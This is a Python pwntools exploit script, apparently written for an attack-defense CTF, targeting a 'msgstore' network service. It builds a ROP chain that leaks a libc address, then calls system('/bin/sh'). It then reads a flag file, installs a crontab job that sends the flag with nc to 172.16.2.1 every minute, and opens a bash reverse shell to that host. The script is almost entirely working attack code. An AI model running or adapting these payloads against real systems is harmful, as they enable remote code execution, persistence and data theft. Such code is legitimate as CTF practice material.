#!/usr/bin/env python
#encoding:utf-8

from pwn import *
import random


pad_char = '\x90'

def SET_PAD_CHAR(c):
    global pad_char
    pad_char = c

def NOPS(n):
    return pad_char * n

def LEFT_PAD(s, n):
    assert len(s) <= n
    return NOPS(n - len(s)) + s

def RIGHT_PAD(s, n):
    assert len(s) <= n
    return s + NOPS(n - len(s))


context.log_level = 'error'

BIN_MAIN = 0x00000000004045CA
LIBC_START_MAIN = 0x00000000000206A0
LIBC_SYSTEM = 0x000000000003F820
LIBC_BINSH = 0x0000000000163C78
io = remote('172.16.%s.1' % args['ID'], 20004)

# local
# LIBC_START_MAIN = 0x0000000000021DD0
# LIBC_SYSTEM = 0x0000000000046640
# LIBC_BINSH = 0x000000000017CCDB
# io = process('./msgstore')

TRASH = random.randint(2, 7) * 4 + random.randint(1, 3)
log.info('trash is %d' % TRASH)
elf = ELF('./msgstore')

payload = NOPS(0x1000 + 48)
# *(int*)0x0000000000406357 = 0x60ebe8 is writable
payload += p64(0x0000000000406357 + 0x10)
# 0x000000000040471a : mov eax, dword ptr [rbp + 0xfffffffffffffff0] ; pop rbp ; ret
payload += p64(0x000000000040471a)
# payload += p64(8) # rdx = 8
payload += p64(8 + TRASH) # rdx = 8
# 0x0000000000406850 : push rsp ; and dword ptr [rax], 0 ; pop rbp ; ret
payload += p64(0x0000000000406850)
# 0x0000000000405742 : mov rdx, qword ptr [rbp + 0xfffffffffffffff0] ; mov qword ptr [rax], rdx ; pop rbp ; ret
payload += p64(0x0000000000405742)
payload += p64(0)
# 0x000000000040a3b3 : pop rdi ; ret
payload += p64(0x000000000040a3b3)
payload += p64(0x000000000060E880) # rdi = stdout
# 0x000000000040a3b1 : pop rsi ; pop r15 ; ret
payload += p64(0x000000000040a3b1)
# payload += p64(elf.got['__libc_start_main']) # rsi = libc start main got
payload += p64(elf.got['__libc_start_main'] - TRASH) # rsi = libc start main got
payload += p64(0)
payload += p64(elf.plt['_ZNSo5writeEPKcl']) # write()
payload += p64(BIN_MAIN)

payload = payload[:0x1010] + p32(len(payload)) + payload[0x1014:]
io.send(p32(len(payload)))

io.send(payload)
io.recvline()
io.recv(TRASH)
start_main_addr = u64(io.recv(8))
log.info('memset addr: 0x%08x' % start_main_addr)


libc_addr = start_main_addr - LIBC_START_MAIN
system_addr = libc_addr + LIBC_SYSTEM
binsh_addr = libc_addr + LIBC_BINSH

payload = NOPS(0x1000 + 48)
payload += p64(0)
# 0x000000000040a3b3 : pop rdi ; ret
payload += p64(0x000000000040a3b3)
payload += p64(binsh_addr) # rdi = addr of /bin/sh
payload += p64(system_addr) # system()
payload += p64(BIN_MAIN)

payload = payload[:0x1010] + p32(len(payload)) + payload[0x1014:]
io.send(p32(len(payload)))

io.send(payload)
io.clean()

io.sendline('cat /home/msgstore/flag')
print io.recv().strip()
io.sendline("echo '* * * * * cat /home/msgstore/flag | nc 172.16.2.1 3000' | crontab -")
io.sendline("bash -c 'bash &>/dev/tcp/172.16.2.1/2004 <&1'")
# io.interactive()
